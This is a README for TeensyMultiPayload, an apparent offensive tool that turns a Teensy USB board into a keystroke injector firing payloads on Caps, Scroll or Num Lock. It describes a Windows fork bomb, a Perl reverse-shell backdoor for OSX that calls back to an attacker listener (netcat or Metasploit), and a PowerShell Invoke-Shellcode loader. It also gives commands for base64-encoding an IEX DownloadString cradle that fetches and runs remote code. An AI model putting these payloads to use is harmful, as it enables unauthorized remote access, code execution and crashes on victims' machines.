# TeensyMultiPayload
TeensyMultiPayload is a program for the [Teensy] (https://www.pjrc.com/teensy/) that allows you to execute multiple payloads for multiple operating systems in seconds with different key presses.

The examples left in the code are a PowerShell command ready to be modified for Invoke-Shellcode, a fork bomb to crash windows, and a perl backdoor for OSX.
The program is entirely configurable for your own needs.
All you need to do to run the payloads after flashing is, plug in the Teensy, wait for the Teensy's LED to blink, then press CAPS LOCK, SCROLL LOCK, or NUM LOCK on the keyboard then each matching payload will execute.

To set up the perl backdoor replace 10.0.0.17:999 with your server IP address and port running a listener of some sort. Possibly netcat or Metasploit.
The fork bomb is all set and should work on all windows computers XP and up.
To generate the Invoke-Shellcode encoded command for PowerShell, modify and execute the below commands on Linux or Cygwin then replace READ_README in TeensyMultiPayload with the output.
For more information on Invoke-Shellcode see: https://github.com/PowerShellMafia/PowerSploit

``scriptblock="IEX (New-Object Net.WebClient).DownloadString(‘Change_To_Your_InvokeShellcode_URL’);"``

``encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"``

``echo $encode``
